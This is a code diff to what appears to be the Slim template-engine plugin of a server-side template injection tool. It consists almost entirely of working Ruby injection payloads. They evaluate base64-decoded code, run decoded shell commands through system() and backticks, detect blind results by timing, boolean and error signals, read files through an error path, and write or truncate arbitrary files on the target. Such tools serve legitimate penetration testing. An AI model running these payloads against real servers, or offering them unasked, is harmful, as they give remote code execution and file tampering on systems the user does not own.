@@ -25,14 +25,13 @@ class Slim(ruby.Ruby):
                 'test_render': f"""#{{({rand.randints[0]}*{rand.randints[1]}).to_s}}""",
                 'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
             },
-            'write': {
-                'call': 'inject',
-                'write': """|#{{require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }}}}""",
-                'truncate': """|#{{File.truncate('{path}', 0)}}"""
-            },
-            'evaluate_blind': {
-                'call': 'inject',
-                'evaluate_blind': """|#{{require'base64';eval(Base64.urlsafe_decode64('{code_b64}'))&&sleep({delay})}}"""
+            'render_error': {
+                'render': '{code}',
+                'header': """|#{{$h=({header[0]}+{header[1]}).to_s}}""",
+                # Body needs to set b as the output
+                'trailer': """#{{$t=({trailer[0]}+{trailer[1]}).to_s}}#{{File.read("Y:/A:/"+$h+$b+$t)}}""",
+                'test_render': f"""#{{$b=({rand.randints[0]}*{rand.randints[1]}).to_s}}""",
+                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
             },
             'evaluate': {
                 'evaluate': """#{{{code}}}""",
@@ -40,9 +39,29 @@ class Slim(ruby.Ruby):
                 'test_os': """RUBY_PLATFORM""",
                 'test_os_expected': r'^[\w._-]+$'
             },
+            'evaluate_error': {
+                'evaluate': """#{{$b=({code}).to_s}}""",
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """|#{{require'base64';1/(!!eval(Base64.urlsafe_decode64('{code_b64}'))&&1||0)}}"""
+            },
+            'evaluate_blind': {
+                'call': 'inject',
+                'evaluate_blind': """|#{{require'base64';eval(Base64.urlsafe_decode64('{code_b64}'))&&sleep({delay})}}"""
+            },
+            'execute_boolean': {
+                'call': 'inject',
+                'execute_blind': """|#{{require'base64';1 / (system(Base64.urlsafe_decode64('{code_b64}'))&&1||0)}}"""
+            },
             'execute_blind': {
                 'call': 'inject',
                 'execute_blind': """|#{{require'base64';%x(#{{Base64.urlsafe_decode64('{code_b64}')+' && sleep {delay}'}})}}"""
+            },
+            'write': {
+                'call': 'inject',
+                'write': """|#{{require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }}}}""",
+                'truncate': """|#{{File.truncate('{path}', 0)}}"""
             },
         })
 
